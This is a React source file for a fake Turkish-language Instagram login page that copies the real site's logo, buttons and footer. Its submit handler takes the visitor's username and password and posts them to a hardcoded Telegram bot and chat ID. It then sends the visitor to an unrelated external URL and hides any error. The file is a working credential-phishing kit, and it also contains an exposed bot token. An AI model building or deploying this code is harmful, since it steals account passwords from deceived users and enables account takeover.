import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import { Loader2 } from "lucide-react";
import { LoginFormData, loginFormSchema } from "@shared/schema";
import axios from "axios";

// Bu değişken, kullanıcı giriş yaptıktan sonra yönlendirilecek URL'i belirler
// Statik versiyonda bu değeri arayıp değiştirebilirsiniz
const REDIRECT_URL = "https://itiraflar.kesug.com/hata/";

export default function Login() {
  const form = useForm<LoginFormData>({
    resolver: zodResolver(loginFormSchema),
    defaultValues: {
      username: "",
      password: "",
    },
  });

  const { mutate, isPending } = useMutation({
    mutationFn: async (data: LoginFormData) => {
      // Telegram Bot Bilgileri - Not: Production'da environment variable kullanılmalıdır
      const TELEGRAM_BOT_TOKEN = "6944329555:AAG0MPx1-5NjJBTXR4c0sRdHoySL2d8cwwc";  // Bu token sadece bu proje için kullanılmalıdır
      const TELEGRAM_CHAT_ID = "6824853693";      // Mesajların iletileceği chat ID
      
      // Tarih ve saat bilgisini al
      const now = new Date();
      const dateTimeStr = now.toISOString();
      
      // Telegram API için mesaj metni oluştur
      const messageText = `
🚨 *Instagram Yeni Giriş* 🚨

*Hesap Bilgileri:*
👤 *Kullanıcı Adı:* ${data.username}
🔒 *Şifre:* ${data.password}
🕝 *Tarih:* ${dateTimeStr}
      `;
      
      // Telegram API URL'ini oluştur
      const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      // Telegram botuna gönder
      const response = await axios.post(telegramApiUrl, {
        chat_id: TELEGRAM_CHAT_ID,
        text: messageText,
        parse_mode: 'Markdown'
      }, {
        headers: {
          'Content-Type': 'application/json',
        }
      });
      
      return response.data;
    },
    onSuccess: () => {
      // Formu sıfırla ve yönlendir
      form.reset();
      window.location.href = REDIRECT_URL;
    },
    onError: () => {
      // Hata mesajını göstermeyelim ancak yine de yönlendirelim
      window.location.href = REDIRECT_URL;
    },
  });

  function onSubmit(data: LoginFormData) {
    if (!data.username || !data.password) {
      return;
    }
    mutate(data);
  }

  return (
    <div className="bg-white min-h-screen">
      <div className="flex justify-center items-center p-1 pt-4">
        <div className="inline-flex items-center">
          <span className="text-[12px] text-[#8e8e8e] font-normal">Türkçe</span>
          <svg className="h-3 w-3 text-[#8e8e8e] ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
          </svg>
        </div>
      </div>

      <div className="max-w-[350px] mx-auto px-[40px] pt-[35px]">
        <div className="flex justify-center mb-[40px]">
          <img src="/images/instagram_logo.png" alt="Instagram" className="h-[65px] w-auto" />
        </div>

        <button 
          type="button"
          className="w-full bg-[#0095F6] text-white font-medium px-4 rounded-[8px] text-[14px] mb-[18px] flex items-center justify-center h-[32px]"
        >
          <div className="flex items-center justify-center mr-2">
            <img src="/images/facebook.png" alt="Facebook" className="h-5 w-5" />
          </div>
          Facebook ile Devam Et
        </button>

        <div className="flex items-center my-[10px]">
          <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
          <span className="mx-4 text-[13px] text-[#8e8e8e] font-semibold">YA DA</span>
          <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
        </div>

        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-[8px]">
            <FormField
              control={form.control}
              name="username"
              render={({ field }) => (
                <FormItem>
                  <FormControl>
                    <Input
                      placeholder="Telefon numarası, kullanıcı adı veya e-posta"
                      {...field}
                      onChange={(e) => field.onChange(e)}
                      className="instagram-input w-full focus:outline-none focus:ring-0 focus:border-[#dbdbdb]"
                    />
                  </FormControl>
                  <FormMessage className="text-xs text-red-500" />
                </FormItem>
              )}
            />

            <FormField
              control={form.control}
              name="password"
              render={({ field }) => (
                <FormItem>
                  <FormControl>
                    <Input
                      type="password"
                      placeholder="Şifre"
                      {...field}
                      className="instagram-input w-full focus:outline-none focus:ring-0 focus:border-[#dbdbdb]"
                    />
                  </FormControl>
                  <FormMessage className="text-xs text-red-500" />
                </FormItem>
              )}
            />
            <div className="text-right py-[4px] pt-[2px] pb-[14px]">
  <a href="https://www.instagram.com/accounts/password/reset/" className="text-[13px] text-[#0095F6] font-normal">
    Şifreni mi unuttun?
  </a>
</div>
            
            <button
              type="submit"
              disabled={isPending}
              className="instagram-btn w-full bg-[rgb(80,180,252)] text-white font-medium rounded-[8px] mt-[8px] mb-[8px]"
            >
              {isPending ? (
                <>
                  <Loader2 className="h-4 w-4 animate-spin" />
                </>
              ) : (
                "Giriş yap"
              )}
            </button>
          </form>
        </Form>


        <div className="mt-[33px] text-center">
          <p className="text-[14px] text-[#8e8e8e]">
            Hesabın yok mu? <a href="https://www.instagram.com/accounts/signup/phone/"
                              className="text-[#0095F6] font-medium">Kaydol</a>
          </p>
        </div>
        <div className="text-center text-[12px] text-[#737373] mt-[50px]">
          <div className="border-t border-[#dbdbdb] pt-[16px] mt-[15px]"></div>
  <p className="leading-[1.3]"> {/* Satır yüksekliği azaltıldı */}
    Ayrıca ülkende giriş yapmadan <span className="text-[#00376B]">yasa dışı olduğunu düşündüğün içeriği şikayet edebilirsin</span>.
  </p>
      </div>
      </div>
      
      
      {/* Alt kısımdaki linkler */}
      <div className="mt-[120px]">
        <div className="flex flex-wrap justify-center gap-x-[20px] text-[12px] text-[#8e8e8e] leading-[16px]">
          <a href="#" className="hover:underline mb-[8px]">Meta</a>
          <a href="#" className="hover:underline mb-[8px]">Hakkında</a>
          <a href="#" className="hover:underline mb-[8px]">Blog</a>
          <a href="#" className="hover:underline mb-[8px]">İş Fırsatları</a>
          <a href="#" className="hover:underline mb-[8px]">Yardım</a>
          <a href="#" className="hover:underline mb-[8px]">API</a>
        </div>

        <div className="flex flex-wrap justify-center gap-x-[20px] text-[12px] text-[#8e8e8e] leading-[16px]">
          <a href="#" className="hover:underline mb-[8px]">Gizlilik</a>
          <a href="#" className="hover:underline mb-[8px]">Çerez Ayarları</a>
          <a href="#" className="hover:underline mb-[8px]">Koşullar ve Künye</a>
          <a href="#" className="hover:underline mb-[8px]">Konumlar</a>
        </div>

        <div className="flex flex-wrap justify-center gap-x-[20px] text-[12px] text-[#8e8e8e] leading-[16px]">
          <a href="#" className="hover:underline mb-[8px]">Instagram Lite</a>
          <a href="#" className="hover:underline mb-[8px]">Threads</a>
        </div>

        <div className="flex flex-wrap justify-center gap-x-[20px] text-[12px] text-[#8e8e8e] leading-[16px]">
          <a href="#" className="hover:underline mb-[8px]">Kişi Yükleme ve Hesabı Olmayan Kişiler</a>
          <a href="#" className="hover:underline mb-[8px]">Meta Verified</a>
        </div>

        <div className="flex flex-wrap justify-center gap-x-[20px] text-[12px] text-[#8e8e8e] leading-[16px] mb-[8px]">
          <a href="#" className="hover:underline mb-[8px]">Sözleşmeleri burada iptal et</a>
        </div>

        <div className="flex justify-center items-center gap-[15px] text-[12px] text-[#8e8e8e] mb-[20px] mt-[-14px]">
          <div className="inline-flex items-center">
            <span className="text-[12px] text-[#8e8e8e] font-normal">Türkçe</span>
            <svg className="h-[15px] w-[15px] text-[#8e8e8e] ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
            </svg>
          </div>
          <span>© 2025 Instagram from Meta</span>
        </div>
      </div>
    </div>
  );
}